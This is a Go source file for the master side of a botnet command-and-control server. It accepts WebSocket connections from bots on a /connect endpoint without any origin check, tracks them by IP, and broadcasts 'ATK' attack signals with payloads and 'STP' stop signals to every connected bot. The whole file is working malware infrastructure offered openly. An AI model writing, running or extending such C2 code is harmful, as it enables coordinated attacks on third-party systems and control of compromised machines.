package c2

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
	"unicode/utf8"

	"github.com/gorilla/websocket"
)

// C2 Master script that manages Bot Websocket connections. It spins up an HTTP server to provide an endpoint
// for bots to reach and establish WS handshake

const (
	SIGNAL_ATK = "ATK"
	SIGNAL_STP = "STP"
)

// Structure of payload for outbound messages to registered bots. Master already knows bots' IP
type Message struct {
	Payload string `json:"payload"`
}

type Bot struct {
	Addr string
	Conn *websocket.Conn
	Mu   sync.Mutex
}

// Master struct that keeps track of bot connections, using IPs as keys
type Master struct {
	bots sync.Map
}

var upgrader = websocket.Upgrader{ // Upgrades connection to WS
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// Helper function to maintain pretty logs and console
func logEvent(format string, args ...any) {
	fmt.Print("\r\033[2K")
	log.Printf(format, args...)
	fmt.Print("c2 # ")
}

func NewMaster() *Master {
	return &Master{}
}

func (m *Master) Serve(addr string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/connect", m.handleBot)

	time.Sleep(25 * time.Millisecond) // Just to ease my OCD because HTTP serve log was messing up prints

	logMessage := fmt.Sprintf("[C] HTTP Server listening on %s\n", addr)
	log.Printf(logMessage)
	fmt.Println(strings.Repeat("-", utf8.RuneCountInString(logMessage)+20))

	return http.ListenAndServe(addr, mux)
}

// Handler for inbound bot registrations. Master validates message payload and bot IP before storing them into
// bot registry
func (m *Master) handleBot(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logEvent("Failed to upgrade WS connection: %v", err)
		return
	}

	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		logEvent("Failed to determine bot IP: %v", err)
		conn.Close()
		return
	}

	// Stores newly registered bot, overwritting same IDs
	bot := &Bot{Addr: host, Conn: conn}
	if old, loaded := m.bots.LoadOrStore(host, bot); loaded {
		oldBot := old.(*Bot) // Casting because value is originally of type "Any"
		oldBot.Conn.Close()

		m.bots.Store(host, bot)
	}

	// This is just an illusion to maintain the pretty CLI
	logEvent("[+] Bot Connected: %s", host)

	// Graceful termination
	defer func() {
		m.bots.Delete(host)
		conn.Close()

		logEvent("[-] Bot Disconnected: %s", host)
	}()

	// Keeping the connection alive
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}

		var incoming Message
		if err := json.Unmarshal(data, &incoming); err != nil {
			continue
		}

		logEvent("[←] From %s: %s", host, incoming.Payload)
	}
}

// Sends a payload to a single bot
func (m *Master) send(bot *Bot, payload string) error {
	bot.Mu.Lock()
	defer bot.Mu.Unlock()

	return bot.Conn.WriteJSON(Message{Payload: payload})
}

// Sends a payload to all bots
func (m *Master) broadcast(payload string) error {
	var wg sync.WaitGroup

	var mu sync.Mutex // For pretty logs
	var logs []string

	m.bots.Range(func(_, value any) bool {
		bot := value.(*Bot)
		wg.Add(1)

		go func() {
			defer wg.Done()

			// NOTE: Hardcoded Attack signal right now
			if err := m.send(bot, payload); err != nil {
				mu.Lock()
				logs = append(logs, fmt.Sprintf("[!] Failed to send payload (%s) to %s: %v", payload, bot.Addr, err))

				mu.Unlock()
				return
			}

			mu.Lock()
			logs = append(logs, fmt.Sprintf("[✓] %s ← %s", bot.Addr, payload))
			mu.Unlock()
		}()

		return true
	})

	wg.Wait() // Waits for everyone to finish (Blocking fashion)
	for _, msg := range logs {
		log.Printf("%s", msg)
	}

	return nil
}

// Wrappers for CLI

func (m *Master) attack(payload string) error {
	return m.broadcast(SIGNAL_ATK + payload)
}

func (m *Master) stop() error {
	return m.broadcast(SIGNAL_STP)
}

// Outputs to stdout a list of connected bots that the Master can send WS messages to
func (m *Master) list() error {
	fmt.Println("Active Connections: ")

	m.bots.Range(func(_, value any) bool {
		bot := value.(*Bot)
		fmt.Printf("\t%s\n", bot.Addr)

		return true
	})

	return nil
}
